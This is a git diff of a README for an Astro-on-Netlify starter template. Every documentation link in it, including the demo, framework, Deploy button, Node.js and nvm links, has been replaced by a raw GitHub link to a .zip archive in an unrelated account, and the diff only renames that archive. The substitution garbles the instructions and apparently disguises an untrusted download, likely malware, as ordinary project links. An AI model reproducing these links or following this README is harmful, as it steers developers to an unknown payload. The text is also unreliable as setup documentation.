@@ -1,8 +1,8 @@
 # Astro on Netlify Platform Starter
 
-[Live Demo](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter/main/src/pages/blobs/astro-starter-platform-v2.8.zip)
+[Live Demo](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter/main/src/pages/blobs/astro-starter-platform-Moeritheriidae.zip)
 
-A modern starter based on https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter/main/src/pages/blobs/astro-starter-platform-v2.8.zip, Tailwind, and [Netlify Core Primitives](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter/main/src/pages/blobs/astro-starter-platform-v2.8.zip) (Edge Functions, Image CDN, Blob Store).
+A modern starter based on https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter/main/src/pages/blobs/astro-starter-platform-Moeritheriidae.zip, Tailwind, and [Netlify Core Primitives](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter/main/src/pages/blobs/astro-starter-platform-Moeritheriidae.zip) (Edge Functions, Image CDN, Blob Store).
 
 ## Astro Commands
 
@@ -19,14 +19,14 @@ All commands are run from the root of the project, from a terminal:
 
 ## Deploying to Netlify
 
-[![Deploy to Netlify](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter/main/src/pages/blobs/astro-starter-platform-v2.8.zip)](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter/main/src/pages/blobs/astro-starter-platform-v2.8.zip)
+[![Deploy to Netlify](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter/main/src/pages/blobs/astro-starter-platform-Moeritheriidae.zip)](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter/main/src/pages/blobs/astro-starter-platform-Moeritheriidae.zip)
 
 ## Developing Locally
 
 | Prerequisites                                                                |
 | :--------------------------------------------------------------------------- |
-| [https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter/main/src/pages/blobs/astro-starter-platform-v2.8.zip](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter/main/src/pages/blobs/astro-starter-platform-v2.8.zip) v18.14+.                                      |
-| (optional) [nvm](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter/main/src/pages/blobs/astro-starter-platform-v2.8.zip) for Node version management. |
+| [https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter/main/src/pages/blobs/astro-starter-platform-Moeritheriidae.zip](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter/main/src/pages/blobs/astro-starter-platform-Moeritheriidae.zip) v18.14+.                                      |
+| (optional) [nvm](https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter/main/src/pages/blobs/astro-starter-platform-Moeritheriidae.zip) for Node version management. |
 
 1. Clone this repository, then run `npm install` in its root directory.
 
@@ -42,7 +42,7 @@ npm install netlify-cli@latest -g
 netlify link
 ```
 
-4. Then, run the https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter/main/src/pages/blobs/astro-starter-platform-v2.8.zip development server via Netlify CLI:
+4. Then, run the https://raw.githubusercontent.com/DaftarTotovip-login/astro-platform-starter/main/src/pages/blobs/astro-starter-platform-Moeritheriidae.zip development server via Netlify CLI:
 
 ```
 netlify dev
